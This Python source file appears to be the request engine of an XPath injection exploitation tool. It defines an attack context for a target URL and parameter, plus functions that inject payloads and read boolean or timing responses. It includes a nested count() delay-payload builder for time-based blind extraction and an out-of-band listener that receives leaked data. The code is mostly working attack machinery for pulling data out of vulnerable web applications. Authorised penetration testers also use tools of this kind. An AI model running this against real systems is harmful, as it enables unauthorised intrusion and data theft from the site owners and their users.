import enum
import time as time_mod
from collections import defaultdict, Counter
from collections.abc import Callable, Iterable
from typing import NamedTuple

from contextlib import asynccontextmanager
from asyncio import BoundedSemaphore

from aiohttp import ClientSession, ClientTimeout, TCPConnector, web
from xcat.oob import create_app


class Encoding(enum.Enum):
    URL = 'url'
    FORM = 'form'


class Injection(NamedTuple):
    name: str
    example: str
    test_template_payloads: Iterable[tuple[str, bool]]
    payload: str | Callable[[str, str], str]

    def __call__(self, working, expression) -> str:
        if callable(self.payload):
            return self.payload(working, expression)
        return self.payload.format(working=working, expression=expression)

    def test_payloads(self, working_value) -> list[tuple[str, bool]]:
        return [
            (template.format(working=working_value), expected_result)
            for template, expected_result in self.test_template_payloads
        ]


class AttackContext(NamedTuple):
    url: str
    method: str
    target_parameter: str
    parameters: dict[str, str]
    match_function: Callable[[int, str], bool]
    concurrency: int
    fast_mode: bool
    body: bytes | None
    headers: dict[str, str]
    encoding: Encoding
    oob_details: str
    tamper_function: Callable[[], None]
    inband: bool = False
    time_based: bool = False
    time_delay_expr: str | None = None
    time_threshold: float = 0.0

    session: ClientSession | None = None
    features: dict[str, bool] = defaultdict(bool)
    common_strings: Counter = Counter()
    common_characters: Counter = Counter()
    injection: Injection | None = None
    # Limiting aiohttp concurrency at the TCPConnector level seems to not work
    # and leads to weird deadlocks. Use a semaphore here.
    semaphore: BoundedSemaphore | None = None
    oob_host: str | None = None
    oob_app: web.Application | None = None

    @asynccontextmanager
    async def start(self, injection: Injection = None) -> 'AttackContext':
        if self.session:
            raise RuntimeError('already has a session')

        semaphore = BoundedSemaphore(self.concurrency)
        connector = TCPConnector(ssl=False, limit=None)
        timeout = ClientTimeout(total=120 if self.time_based else 30)
        async with ClientSession(headers=self.headers, connector=connector, trust_env=True, timeout=timeout) as sesh:
            yield self._replace(session=sesh, injection=injection, semaphore=semaphore)

    @asynccontextmanager
    async def start_oob_server(self) -> 'AttackContext':
        if self.oob_app:
            raise RuntimeError('OOB server has already been started')

        host, port = self.oob_details.split(':', 1)

        app = create_app()
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', int(port))
        await site.start()

        new_ctx = self._replace(oob_host=f'http://{host}:{port}', oob_app=app)

        try:
            yield new_ctx
        finally:
            await runner.cleanup()

    @asynccontextmanager
    async def null_context(self) -> 'AttackContext':
        yield self

    @property
    def target_parameter_value(self):
        return self.parameters[self.target_parameter]


def make_delay_payload(nesting: int) -> str:
    """Build nested count() expression that causes computational delay."""
    payload = "count((//.))"
    for _ in range(nesting - 1):
        payload = f"count((//.)[{payload}])"
    return payload


async def timed_request(context: AttackContext, raw_value: str) -> float:
    """Send a request with the given raw value and return elapsed time in seconds."""
    if not context.session:
        raise ValueError('AttackContext has no session. Use start()')

    parameters = context.parameters.copy()
    parameters[context.target_parameter] = raw_value
    if context.encoding == Encoding.URL:
        args = {'params': parameters, 'data': context.body}
    else:
        args = {'data': parameters}
    if context.tamper_function:
        context.tamper_function(context, args)

    async with context.semaphore:
        start = time_mod.monotonic()
        async with context.session.request(context.method, context.url, **args) as resp:
            await resp.text()
        return time_mod.monotonic() - start


async def check(context: AttackContext, payload: str):
    if not context.session:
        raise ValueError('AttackContext has no session. Use start()')

    parameters = context.parameters.copy()
    if context.injection:
        if context.time_based:
            from xpath import E
            timed_payload = E(f"{payload} and {context.time_delay_expr}")
            payload = context.injection(context.target_parameter_value, timed_payload)
        else:
            payload = context.injection(context.target_parameter_value, payload)
    parameters[context.target_parameter] = str(payload)
    if context.encoding == Encoding.URL:
        args = {'params': parameters, 'data': context.body}
    else:
        args = {'data': parameters}
    if context.tamper_function:
        context.tamper_function(context, args)

    async with context.semaphore:
        if context.time_based:
            start = time_mod.monotonic()
            async with context.session.request(context.method, context.url, **args) as resp:
                await resp.text()
                elapsed = time_mod.monotonic() - start
            return elapsed >= context.time_threshold
        else:
            async with context.session.request(context.method, context.url, **args) as resp:
                body = await resp.text()
                return context.match_function(resp.status, body)


async def get_response_body(context: AttackContext, raw_value: str,
                           param_overrides: dict[str, str] | None = None) -> str:
    """Send a request with a specific raw value for the target parameter and return the response body."""
    body, _ = await get_response_with_match(context, raw_value, param_overrides)
    return body


async def get_response_with_match(context: AttackContext, raw_value: str,
                                  param_overrides: dict[str, str] | None = None) -> tuple[str, bool]:
    """Send a request and return (body, match_result) tuple.

    Like get_response_body but also evaluates the match function so the
    caller knows whether the response represents a 'true' (data present)
    or 'false' (no data) result.
    """
    if not context.session:
        raise ValueError('AttackContext has no session. Use start()')

    parameters = context.parameters.copy()
    parameters[context.target_parameter] = raw_value
    if param_overrides:
        parameters.update(param_overrides)
    if context.encoding == Encoding.URL:
        args = {'params': parameters, 'data': context.body}
    else:
        args = {'data': parameters}
    if context.tamper_function:
        context.tamper_function(context, args)

    async with context.semaphore:
        async with context.session.request(context.method, context.url, **args) as resp:
            body = await resp.text()
            match = context.match_function(resp.status, body)
            return body, match
